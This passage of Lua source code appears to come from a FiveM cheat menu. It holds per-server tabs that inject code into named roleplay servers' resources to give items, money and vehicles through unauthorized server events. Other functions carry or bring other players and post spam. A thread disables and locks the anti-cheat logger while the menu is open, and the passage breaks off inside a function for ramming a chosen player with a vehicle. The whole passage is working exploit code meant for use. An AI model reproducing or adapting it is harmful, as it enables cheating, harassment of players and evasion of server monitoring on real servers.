            -- Random item selection from ox_inventory and data structure
            MachoInjectResource("ox_inventory", string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                if not items then
                    TriggerEvent('QBCore:Notify', 'ox_inventory:Items() function returned nil. Please check ox_inventory resource.', 'error')
                    return
                end

                for itemName, _ in pairs(items) do
                    local slots = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(slots or {}) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                            
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]], itemKod, miktar))
        end)

        -- Yellow Pages Inputs
        local NameInputHandle = MachoMenuInputbox(TradeSection, "Name", "Name to appear in yellow pages")
        local PhoneInputHandle = MachoMenuInputbox(TradeSection, "Phone Number", "Example: 123-456-7890")
        local MessageInputHandle = MachoMenuInputbox(TradeSection, "Message", "Text to appear in yellow pages")
        
        -- Yellow Pages Button
        MachoMenuButton(TradeSection, "Send to Yellow Pages", function()
            local name = MachoMenuGetInputbox(NameInputHandle)
            local phone = MachoMenuGetInputbox(PhoneInputHandle)
            local message = MachoMenuGetInputbox(MessageInputHandle)
        
            if not name or name == "" then
                MachoMenuNotification("Error", "Please enter a name!")
                return
            end
        
            if not phone or phone == "" then
                MachoMenuNotification("Error", "Please enter a phone number!")
                return
            end
        
            if not message or message == "" then
                MachoMenuNotification("Error", "Please enter a message!")
                return
            end
        
            -- Yellow Pages Post with MachoInjectResource
            MachoInjectResource("gksphone", string.format([[
                TriggerServerEvent('gksphone:yellow_postPagess', "%s", "%s", "%s", "", "bartender")
            ]], name, phone, message))
            
            MachoMenuNotification("Success", "Sent to yellow pages!")
        end)
    end

    -- XX Gun
    if serverName:find("XX Gun") then
        local TradeTab = MachoMenuAddTab(MenuWindow, "XX Gun")
        local TradeSection = MachoMenuGroup(TradeTab, "XX Gun Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)

        local InputBoxItemCode = MachoMenuInputbox(TradeSection, "Item Code", "e.g., sandwich")
        local InputBoxItemAmount = MachoMenuInputbox(TradeSection, "Amount", "e.g., 3")

        MachoMenuButton(TradeSection, "Give Item", function()
            local item = MachoMenuGetInputbox(InputBoxItemCode)
            local amount = tonumber(MachoMenuGetInputbox(InputBoxItemAmount)) or 1

            if item ~= "" and amount > 0 then
                MachoInjectResource('any', string.format([[
                    local core = exports['monitor']:GetCoreObject()
                    local item = { name = "%s" }
                    local amount = %d
    
                    for i = amount, 1, -1 do
                        TriggerServerEvent('Drones:Back', item, core.Key)
                    end
                ]], item, amount))
            else
                MachoMenuNotification("Error", "Please enter a valid item code and amount!")
            end
        end)
    end

    -- Owl Roleplay
    if serverName:find("Owl Roleplay") then
        local TradeTab = MachoMenuAddTab(MenuWindow, "Owl Roleplay")
        local TradeSection = MachoMenuGroup(TradeTab, "Owl Roleplay Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
    
        -- Inputs: Item Name and Amount
        local KodInputHandle = MachoMenuInputbox(TradeSection, "Code Name", "Example: item_code")
        local KodMiktarInputHandle = MachoMenuInputbox(TradeSection, "Code Amount", "Example: 3")
    
        -- Button: Start Process
        MachoMenuButton(TradeSection, "Item Exploit", function()
            local itemKod = MachoMenuGetInputbox(KodInputHandle)
            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))
    
            if not itemKod or itemKod == "" then
                MachoMenuNotification("Error", "Please enter a code name!")
                return
            end
    
            if not miktar or miktar <= 0 then
                MachoMenuNotification("Error", "Please enter a valid amount!")
                return
            end
    
            -- Add item with t1-rgbcontroller
            MachoInjectResource("t1-rgbcontroller", string.format([[
                TriggerServerEvent('t1-rgbcontroller:sv:AddItem', '%s', %d)
            ]], itemKod, miktar))
    
            -- Notification: Process successful
            MachoMenuNotification("Success", string.format("%d %s added!", miktar, itemKod))
        end)

        -- Input: Target Player ID
        local TargetPlayerIdHandle = MachoMenuInputbox(TradeSection, "Target Player ID", "Example: 123")

        -- Button: Carry Player
        MachoMenuButton(TradeSection, "Carry Player", function()
            local targetPlayerId = tonumber(MachoMenuGetInputbox(TargetPlayerIdHandle))

            if not targetPlayerId or targetPlayerId <= 0 then
                MachoMenuNotification("Error", "Please enter a valid player ID!")
                return
            end

            -- Carry player with t1-cr
            MachoInjectResource("t1-cr", string.format([[
                TriggerServerEvent('t1-cr:tasi-target-server', %d)
            ]], targetPlayerId))

            -- Notification: Process successful
            MachoMenuNotification("Success", string.format("Player ID %d carried!", targetPlayerId))
        end)
    end

    -- Light Roleplay
    if serverName:find("Light Roleplay") then
        local TradeTab = MachoMenuAddTab(MenuWindow, "Light Roleplay")
        local TradeSection = MachoMenuGroup(TradeTab, "Light Roleplay Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)

        -- Inputs: Item Name and Amount
        local KodInputHandle = MachoMenuInputbox(TradeSection, "Code Name", "Example: item_code")
        local KodMiktarInputHandle = MachoMenuInputbox(TradeSection, "Code Amount", "Example: 3")

        -- Button: Start Process
        MachoMenuButton(TradeSection, "Item Exploit", function()
            local itemKod = MachoMenuGetInputbox(KodInputHandle)
            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))

            if not itemKod or itemKod == "" then
                MachoMenuNotification("Error", "Please enter a code name!")
                return
            end

            if not miktar or miktar <= 0 then
                MachoMenuNotification("Error", "Please enter a valid amount!")
                return
            end

            -- Inject with random item selection
            MachoInjectResource("ox_inventory", string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                for itemName, _ in pairs(items) do
                    local items = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(items) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                              
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]], itemKod, miktar))
        end)

        -- Yellow Pages Inputs
        local NameInputHandle = MachoMenuInputbox(TradeSection, "Name", "Name to appear in yellow pages")
        local PhoneInputHandle = MachoMenuInputbox(TradeSection, "Phone Number", "Example: 123-456-7890")
        local MessageInputHandle = MachoMenuInputbox(TradeSection, "Message", "Text to appear in yellow pages")
        
        -- Yellow Pages Button
        MachoMenuButton(TradeSection, "Send to Yellow Pages", function()
            local name = MachoMenuGetInputbox(NameInputHandle)
            local phone = MachoMenuGetInputbox(PhoneInputHandle)
            local message = MachoMenuGetInputbox(MessageInputHandle)
        
            if not name or name == "" then
                MachoMenuNotification("Error", "Please enter a name!")
                return
            end
        
            if not phone or phone == "" then
                MachoMenuNotification("Error", "Please enter a phone number!")
                return
            end
        
            if not message or message == "" then
                MachoMenuNotification("Error", "Please enter a message!")
                return
            end
        
            -- Yellow Pages Post with MachoInjectResource
            MachoInjectResource("gksphone", string.format([[
                TriggerServerEvent('gksphone:yellow_postPagess', "%s", "%s", "%s", "", "bartender")
            ]], name, phone, message))
            
            MachoMenuNotification("Success", "Sent to yellow pages!")
        end)
    end

    -- Aera Roleplay
    if serverName:find("Aera Roleplay") then
        local ValoriaTab = MachoMenuAddTab(MenuWindow, "Aera Roleplay")
        local ValoriaSection = MachoMenuGroup(ValoriaTab, "Item Exploit", TabSectionWidth, 0, MenuSize.x - TabSectionWidth + 150, 150)

        -- Item code text box
        local InputBoxItemCode = MachoMenuInputbox(ValoriaSection, "Item Code", "e.g., sandwich")

        -- Amount text box
        local InputBoxItemAmount = MachoMenuInputbox(ValoriaSection, "Amount", "e.g., 3")

        -- Give Item button
        MachoMenuButton(ValoriaSection, "Give Item", function()
            local item = MachoMenuGetInputbox(InputBoxItemCode)
            local amount = tonumber(MachoMenuGetInputbox(InputBoxItemAmount)) or 1

            if item ~= "" and amount > 0 then
                MachoInjectResource('monitor', string.format([[ 
                    TriggerServerEvent("jim-mining:server:toggleItem", -1, "%s", %d) 
                ]], item, amount, item, amount))
            else
                MachoMenuNotification("Error", "Please enter a valid item code and amount!")
            end
        end)
    end

    -- Istanbul Roleplay
    if serverName:find("Istanbul Roleplay") then
        local TradeTab = MachoMenuAddTab(MenuWindow, "Istanbul Roleplay")
        local TradeSection = MachoMenuGroup(TradeTab, "Istanbul Roleplay Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
    
        -- Item Exploit
        local KodInputHandle = MachoMenuInputbox(TradeSection, "Code Name", "Example: item_code")
        local KodMiktarInputHandle = MachoMenuInputbox(TradeSection, "Code Amount", "Example: 3")
    
        MachoMenuButton(TradeSection, "Item Exploit", function()
            local itemKod = MachoMenuGetInputbox(KodInputHandle)
            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))
    
            if not itemKod or itemKod == "" then
                MachoMenuNotification("Error", "Please enter a code name!")
                return
            end
    
            if not miktar or miktar <= 0 then
                MachoMenuNotification("Error", "Please enter a valid amount!")
                return
            end
    
            -- Inject with random item selection
            MachoInjectResource("ox_inventory", string.format([[
                local items = exports.ox_inventory:Items()
                local playerItems = []
    
                for itemName, _ in pairs(items) do
                    local count = exports.ox_inventory:GetItemCount(itemName)
                    if count and count > 0 then
                        table.insert(playerItems, itemName)
                    end
                end
    
                if #playerItems == 0 then
                    return
                end
    
                local randomItem = playerItems[math.random(1, #playerItems)]
                local tradeData = {
                    first = { amount = 0, name = randomItem },
                    second = { amount = { max = %d, min = %d }, name = "%s" },
                    third = nil
                }
    
                TriggerServerEvent("earth-illegal:server:TradeItem", tradeData.first, tradeData.second, tradeData.third)
            ]], miktar, miktar, itemKod))
        end)
    
        -- Money Exploit
        MachoMenuText(TradeSection, "Money Exploit")
        local PaymentTypeInputBoxHandle = MachoMenuInputbox(TradeSection, "Payment Type", "Only Cash or Bank")
        local RefundAmountInputBoxHandle = MachoMenuInputbox(TradeSection, "Money Amount", "Example: 10000")
    
        MachoMenuButton(TradeSection, "Spawn Money", function()
            local RefundData = {
                paymentType = MachoMenuGetInputbox(PaymentTypeInputBoxHandle),
                refund = tonumber(MachoMenuGetInputbox(RefundAmountInputBoxHandle)) or 11111,
                playerId = GetPlayerServerId(PlayerId())
            }
    
            -- Payment type validation
            if RefundData.paymentType ~= "Cash" and RefundData.paymentType ~= "Bank" then
                MachoMenuNotification("Error", "Payment type must be 'Cash' or 'Bank'!")
                return
            end
    
            if not RefundData.refund or RefundData.refund <= 0 then
                MachoMenuNotification("Error", "Please enter a valid money amount!")
                return
            end
    
            MachoInjectResource('monitor', string.format([[
                TriggerServerEvent('CL-PoliceGarageV2:RefundRent', "%s", %d, %d, "policejob")
            ]], RefundData.paymentType, RefundData.refund, RefundData.playerId))
    
            MachoMenuNotification("Success", "Money exploit sent! Amount: " .. RefundData.refund)
        end)
    
        -- Vehicle Data Exploit
        MachoMenuText(TradeSection, "Vehicle Data Exploit")
        local InputBoxVehicleName = MachoMenuInputbox(TradeSection, "Vehicle Name", "Example: sultan")
    
        MachoMenuButton(TradeSection, "Send Vehicle", function()
            local vehicleName = MachoMenuGetInputbox(InputBoxVehicleName)
    
            if not vehicleName or vehicleName == "" then
                MachoMenuNotification("Error", "Vehicle name cannot be empty!")
                return
            end
    
            MachoInjectResource('CL-PoliceGarage', string.format([[
                TriggerServerEvent("CL-PoliceGarage:TakeMoney", "cash", 0, "%s", "%s")
            ]], vehicleName, vehicleName, vehicleName))
    
            MachoMenuNotification("Success", "Vehicle exploit sent! Vehicle: " .. vehicleName)
        end)
    
        -- Vehicle Data V2
        MachoMenuText(TradeSection, "Vehicle Data V2")
        local InputBoxVehicleNameV2 = MachoMenuInputbox(TradeSection, "Vehicle Code", "Example: adder")
    
        MachoMenuButton(TradeSection, "Send Vehicle V2", function()
            local vehicleNameV2 = MachoMenuGetInputbox(InputBoxVehicleNameV2)
    
            if not vehicleNameV2 or vehicleNameV2 == "" then
                MachoMenuNotification("Error", "Vehicle code cannot be empty!")
                return
            end
    
            MachoInjectResource('pa-vehicleshop', string.format([[
                TriggerServerEvent('pa-vehicleshop:buyVehicle:server', "bank", "%s", 1, 1, nil, "cardealer")
            ]], vehicleNameV2, vehicleNameV2))
    
            MachoMenuNotification("Success", "Vehicle V2 exploit sent! Vehicle: " .. vehicleNameV2)
        end)
    
        -- All Bring
        MachoMenuText(TradeSection, "All Bring")
        MachoMenuButton(TradeSection, "All Bring", function()
            MachoInjectResource('monitor', [[
                TriggerServerEvent('ServerValidEmote', '-1', 'dog', 'dog', 1405553601)
            ]])
    
            MachoMenuNotification("Success", "All Bring exploit sent!")
        end)
    end

    -- Ria Roleplay
    if serverName:find("Ria Roleplay") then
        local TradeTab = MachoMenuAddTab(MenuWindow, "Ria Roleplay")
        local TradeSection = MachoMenuGroup(TradeTab, "Ria Roleplay Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)

        -- Item Exploit
        local KodInputHandle = MachoMenuInputbox(TradeSection, "Code Name", "Example: item_code")
        local KodMiktarInputHandle = MachoMenuInputbox(TradeSection, "Code Amount", "Example: 3")
    
        MachoMenuButton(TradeSection, "Item Exploit", function()
            local itemKod = MachoMenuGetInputbox(KodInputHandle)
            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))
    
            if not itemKod or itemKod == "" then
                MachoMenuNotification("Error", "Please enter a code name!")
                return
            end
    
            if not miktar or miktar <= 0 then
                MachoMenuNotification("Error", "Please enter a valid amount!")
                return
            end
    
            -- Random item selection from ox_inventory and data structure
            MachoInjectResource("ox_inventory", string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                if not items then
                    TriggerEvent('QBCore:Notify', 'ox_inventory:Items() function returned nil. Please check ox_inventory resource.', 'error')
                    return
                end

                for itemName, _ in pairs(items) do
                    local slots = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(slots or {}) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                            
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("earth-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]], itemKod, miktar))
        end)

        -- Yellow Pages Inputs
        local NameInputHandle = MachoMenuInputbox(TradeSection, "Name", "Name to appear in yellow pages")
        local PhoneInputHandle = MachoMenuInputbox(TradeSection, "Phone Number", "Example: 123-456-7890")
        local MessageInputHandle = MachoMenuInputbox(TradeSection, "Message", "Text to appear in yellow pages")
    
        -- Yellow Pages Button
        MachoMenuButton(TradeSection, "Send to Yellow Pages", function()
            local name = MachoMenuGetInputbox(NameInputHandle)
            local phone = MachoMenuGetInputbox(PhoneInputHandle)
            local message = MachoMenuGetInputbox(MessageInputHandle)
    
            if not name or name == "" then
                MachoMenuNotification("Error", "Please enter a name!")
                return
            end
    
            if not phone or phone == "" then
                MachoMenuNotification("Error", "Please enter a phone number!")
                return
            end
    
            if not message or message == "" then
                MachoMenuNotification("Error", "Please enter a message!")
                return
            end
    
            -- Yellow Pages Post
            TriggerServerEvent('gksphone:yellow_postPagess', name, phone, message, "", "bartender")
            MachoMenuNotification("Success", "Sent to yellow pages!")
        end)
    end

    -- Gonna Roleplay
    if serverName:find("Gonna Roleplay") then
        local TradeTab = MachoMenuAddTab(MenuWindow, "Gonna Roleplay")
        local TradeSection = MachoMenuGroup(TradeTab, "Gonna Roleplay Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)

        -- Inputs: Item Name and Amount
        local KodInputHandle = MachoMenuInputbox(TradeSection, "Code Name", "Example: item_code")
        local KodMiktarInputHandle = MachoMenuInputbox(TradeSection, "Code Amount", "Example: 3")

        -- Button: Start Process
        MachoMenuButton(TradeSection, "Item Exploit", function()
            local itemKod = MachoMenuGetInputbox(KodInputHandle)
            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))

            if not itemKod or itemKod == "" then
                MachoMenuNotification("Error", "Please enter a code name!")
                return
            end

            if not miktar or miktar <= 0 then
                MachoMenuNotification("Error", "Please enter a valid amount!")
                return
            end

            -- Inject with random item selection
            MachoInjectResource("ox_inventory", string.format([[
                local items = exports.ox_inventory:Items()
                local playerItems = {}

                for itemName, _ in pairs(items) do
                    local count = exports.ox_inventory:GetItemCount(itemName)
                    if count and count > 0 then
                        table.insert(playerItems, itemName)
                    end
                end

                if #playerItems == 0 then
                    return
                end

                local randomItem = playerItems[math.random(1, #playerItems)]

                TriggerServerEvent("gonna-illegal:server:TradeItem", 
                    json.decode(string.format('{"amount":0,"name":"%%s"}', randomItem)), 
                    json.decode(string.format('{"amount":{"max":%d,"min":%d},"name":"%s"}', %d, %d, "%s")), 
                    json.decode('null')
                )
            ]], miktar, miktar, itemKod, miktar, miktar, itemKod))
        end)
    end

    -- Royal Roleplay
    if serverName:find("Royal Roleplay") then
        local TradeTab = MachoMenuAddTab(MenuWindow, "Royal Roleplay")
        local TradeSection = MachoMenuGroup(TradeTab, "Royal Roleplay Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
    
        -- Item Exploit
        local KodInputHandle = MachoMenuInputbox(TradeSection, "Code Name", "Example: item_code")
        local KodMiktarInputHandle = MachoMenuInputbox(TradeSection, "Code Amount", "Example: 3")
    
        MachoMenuButton(TradeSection, "Item Exploit", function()
            local itemKod = MachoMenuGetInputbox(KodInputHandle)
            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))
    
            if not itemKod or itemKod == "" then
                MachoMenuNotification("Error", "Please enter a code name!")
                return
            end
    
            if not miktar or miktar <= 0 then
                MachoMenuNotification("Error", "Please enter a valid amount!")
                return
            end
    
            -- Random item selection from ox_inventory and data structure
            MachoInjectResource("ox_inventory", string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                if not items then
                    TriggerEvent('QBCore:Notify', 'ox_inventory:Items() function returned nil. Please check ox_inventory resource.', 'error')
                    return
                end

                for itemName, _ in pairs(items) do
                    local slots = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(slots or {}) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                            
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("earth-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]], itemKod, miktar))
        end)
    end

    -- Rac10 Exploits
    if serverName:find("Rac10") then
        local ExploitMenuTab = MachoMenuAddTab(MenuWindow, "Rac10 Exploits")
        local ExploitSection = MachoMenuGroup(ExploitMenuTab, "Rac10 Exploits", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
        
        -- 1. VEHICLE EXPLOIT
        MachoMenuText(ExploitSection, "Vehicle Exploit")
        local VehicleModelInputBoxHandle = MachoMenuInputbox(ExploitSection, "Vehicle Model", "e.g., hakuchou")
        local VehiclePlateInputBoxHandle = MachoMenuInputbox(ExploitSection, "Plate", "e.g., 34AKP952")
        
        MachoMenuButton(ExploitSection, "Spawn Vehicle", function()
            local VehicleData = {
                model = MachoMenuGetInputbox(VehicleModelInputBoxHandle) or "hakuchou",
                plate = MachoMenuGetInputbox(VehiclePlateInputBoxHandle) or "34AKP952"
            }
        
            if VehicleData.model and VehicleData.model ~= "" and VehicleData.plate and VehicleData.plate ~= "" then
                MachoInjectResource('monitor', string.format([[ 
                    local model = "%s"
                    local plate = "%s"
                    local playerPed = PlayerPedId()
                    local spawnLoc = GetEntityCoords(playerPed)
                    local spawnHeading = GetEntityHeading(playerPed)
        
                    QBCore.Functions.SpawnVehicle(model, function(veh)
                        SetEntityHeading(veh, spawnHeading)
                        SetVehicleNumberPlateText(veh, plate)
                        TaskWarpPedIntoVehicle(playerPed, veh, -1)
                        SetVehicleEngineOn(veh, true, true)
                        Citizen.Wait(500)
                        TriggerEvent("bb_admin:client:SaveCar")
                    end, spawnLoc, true)
                ]], VehicleData.model, VehicleData.plate))
                MachoMenuNotification("Success", "Vehicle spawned!")
            else
                MachoMenuNotification("Error", "Please enter a valid vehicle model and plate!")
            end
        end)
        
        -- 2. MONEY EXPLOIT
        MachoMenuText(ExploitSection, "Money Exploit")
        local MoneyAmountInputBoxHandle = MachoMenuInputbox(ExploitSection, "Money Amount", "e.g., 100000")
        
        MachoMenuButton(ExploitSection, "Spawn Money", function()
            local MoneyData = {
                amount = tonumber(MachoMenuGetInputbox(MoneyAmountInputBoxHandle)) or 100000
            }
        
            if MoneyData.amount > 0 then
                MachoInjectResource('qb-taxijob', string.format([[ 
                    TriggerServerEvent('qb-taxi:server:NpcPay', %d)
                ]], MoneyData.amount))
                MachoMenuNotification("Success", "Money exploit executed!")
            else
                MachoMenuNotification("Error", "Please enter a valid money amount!")
            end
        end)
        
        -- 3. ITEM EXPLOIT
        MachoMenuText(ExploitSection, "Item Exploit")
        local ItemCodeInputBoxHandle = MachoMenuInputbox(ExploitSection, "Item Code", "e.g., weapon_pistol")
    
        MachoMenuButton(ExploitSection, "Give Item", function()
            local itemCode = MachoMenuGetInputbox(ItemCodeInputBoxHandle) or "weapon_pistol"
    
            if itemCode ~= "" then
                MachoInjectResource('monitor', string.format([[ 
                    QBCore.Functions.TriggerCallback('bz:itemsver', function(item)
                    end, '%s')
                ]], itemCode))
                MachoMenuNotification("Success", "Item exploit executed!")
            else
                MachoMenuNotification("Error", "Please enter a valid item code!")
            end
        end)
    end

    -- Xen Roleplay
    if serverName:find("Xen Roleplay") then
        local ItemExploitTab = MachoMenuAddTab(MenuWindow, "Xen Roleplay")
        local ItemExploitSection = MachoMenuGroup(ItemExploitTab, "Xen Roleplay", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
    
        -- Item name input box
        local ItemInputBoxHandle = MachoMenuInputbox(ItemExploitSection, "Item Name", "...")
        -- Amount input box
        local AmountInputBoxHandle = MachoMenuInputbox(ItemExploitSection, "Amount", "1")
    
        MachoMenuButton(ItemExploitSection, "Add Item", function()
            local ItemData = { 
                item = MachoMenuGetInputbox(ItemInputBoxHandle), 
                amount = tonumber(MachoMenuGetInputbox(AmountInputBoxHandle)) or 1 
            }
    
            if ItemData.item and ItemData.item ~= "" and ItemData.amount > 0 then
                -- Add item to server
                MachoInjectResource('savana-restaurant', string.format([[
                    TriggerServerEvent('savana-restaurant:giveItem', "%s", %d)
                ]], ItemData.item, ItemData.amount, ItemData.item, ItemData.amount))
            else
                MachoMenuNotification("Error", "Please enter a valid item name and amount!")
            end
        end)
    end

    -- HotV
    if serverName:find("HotV") then
        local TradeTab = MachoMenuAddTab(MenuWindow, "HotV")
        local TradeSection = MachoMenuGroup(TradeTab, "HotV Item", TabSectionWidth, 9, MenuSize.x - TabSectionWidth + 150, MenuSize.y)
    
        -- Item Exploit
        local KodInputHandle = MachoMenuInputbox(TradeSection, "Code Name", "Example: item_code")
        local KodMiktarInputHandle = MachoMenuInputbox(TradeSection, "Code Amount", "Example: 3")
    
        MachoMenuButton(TradeSection, "Item Exploit", function()
            local itemKod = MachoMenuGetInputbox(KodInputHandle)
            local miktar = tonumber(MachoMenuGetInputbox(KodMiktarInputHandle))
    
            if not itemKod or itemKod == "" then
                MachoMenuNotification("Error", "Please enter a code name!")
                return
            end
    
            if not miktar or miktar <= 0 then
                MachoMenuNotification("Error", "Please enter a valid amount!")
                return
            end
    
            -- Random item selection from ox_inventory and data structure
            MachoInjectResource("ox_inventory", string.format([[
                local itemismi = "%s"
                local miktar = %d

                miktar = tonumber(miktar)

                local playerItems = {}

                local items = exports.ox_inventory:Items()
                for itemName, _ in pairs(items) do
                    local items = exports.ox_inventory:GetSlotsWithItem(itemName)
                    for i, item in ipairs(items) do
                        if item.count == 1 and i == 1 and string.lower(item.name) ~= itemismi then
                            table.insert(playerItems, item.name)
                        end 
                    end
                end
                              
                if #playerItems == 0 then
                    TriggerEvent('QBCore:Notify', 'No items in inventory! Or place 1 item (quantity 1) at the beginning of slot', 'error')
                    return
                end
                            
                local randomItem = playerItems[math.random(1, #playerItems)]
                local data = {
                    GiveItem = {
                        {
                            Item = itemismi,
                            label = "Meth Level 3 - 35000$",
                            Count = miktar
                        }
                    },
                    RequiredItems = {
                        {
                            Item = randomItem,
                            Count = 1
                        }
                    }
                }
                            
                -- Send only specified amount to server
                TriggerServerEvent("-other:server:SellItem", data, exports["monitor"]:GetCoreObject().Key)
            ]], itemKod, miktar))
        end)
    
        -- Yellow Pages Inputs
        local NameInputHandle = MachoMenuInputbox(TradeSection, "Name", "Name to appear in yellow pages")
        local PhoneInputHandle = MachoMenuInputbox(TradeSection, "Phone Number", "Example: 123-456-7890")
        local MessageInputHandle = MachoMenuInputbox(TradeSection, "Message", "Text to appear in yellow pages")
    
        -- Yellow Pages Button
        MachoMenuButton(TradeSection, "Send to Yellow Pages", function()
            local name = MachoMenuGetInputbox(NameInputHandle)
            local phone = MachoMenuGetInputbox(PhoneInputHandle)
            local message = MachoMenuGetInputbox(MessageInputHandle)
    
            if not name or name == "" then
                MachoMenuNotification("Error", "Please enter a name!")
                return
            end
    
            if not phone or phone == "" then
                MachoMenuNotification("Error", "Please enter a phone number!")
                return
            end
    
            if not message or message == "" then
                MachoMenuNotification("Error", "Please enter a message!")
                return
            end
    
            -- Yellow Pages Post
            TriggerServerEvent('gksphone:yellow_postPagess', name, phone, message, "", "bartender")
            MachoMenuNotification("Success", "Sent to yellow pages!")
        end)
    end

    -- Black Roleplay
    if serverName:find("Black Roleplay") then
        local ValoriaTab = MachoMenuAddTab(MenuWindow, "Black Roleplay")
        local ValoriaSection = MachoMenuGroup(ValoriaTab, "Item Exploit", TabSectionWidth, 0, MenuSize.x - TabSectionWidth + 150, 150)

        -- Item code text box
        local InputBoxItemCode = MachoMenuInputbox(ValoriaSection, "Item Code", "e.g., sandwich")

        -- Amount text box
        local InputBoxItemAmount = MachoMenuInputbox(ValoriaSection, "Amount", "e.g., 3")

        -- Give Item button
        MachoMenuButton(ValoriaSection, "Give Item", function()
            local item = MachoMenuGetInputbox(InputBoxItemCode)
            local amount = tonumber(MachoMenuGetInputbox(InputBoxItemAmount)) or 1

            if item ~= "" and amount > 0 then
                MachoInjectResource('monitor', string.format([[ 
                    TriggerServerEvent("jim-consumables:server:toggleItem", -1, "%s", %d) 
                ]], item, amount, item, amount))
            else
                MachoMenuNotification("Error", "Please enter a valid item code and amount!")
            end
        end)
    end
end)

-- Logger control and force render while menu is open
Citizen.CreateThread(function()
    -- Lock logger completely when menu starts
    MachoLockLogger()
    
    while menu do
        -- Logger control and user notification while menu is open
        if MachoMenuIsOpen(MenuWindow) then
            if MachoGetLoggerState() ~= 0 then
                MachoSetLoggerState(0)
                MachoLockLogger()
                MachoMenuNotification("Error", "Logger cannot be active while using the menu!")
            end
        end
        Citizen.Wait(0)
    end
end)

function ShowGTAStyleInput(title, defaultText, maxInputLength, callback)
    DisplayOnscreenKeyboard(1, title, "", defaultText, "", "", "", maxInputLength)
    while UpdateOnscreenKeyboard() == 0 do
        Wait(0)
    end
    if GetOnscreenKeyboardResult() then
        local input = GetOnscreenKeyboardResult()
        callback(input)
    end
end

-- Function to get the player's server ID by their name
function GetPlayerServerIdByName(playerName)
    local playerServerId = nil
    for i = 0, 255 do
        if NetworkIsPlayerActive(i) then
            local playerId = GetPlayerServerId(i)
            local playerNameServer = GetPlayerName(i)
            if playerNameServer == playerName then
                playerServerId = playerId
                break
            end
        end
    end
    return playerServerId
end

-- Function to spawn a vehicle and ram the player
function RamPlayer(playerServerId)
    local playerId = GetPlayerFromServerId(playerServerId)
    if playerId then
        local targetPed = GetPlayerPed(playerId)
        local targetCoords = GetEntityCoords(targetPed)
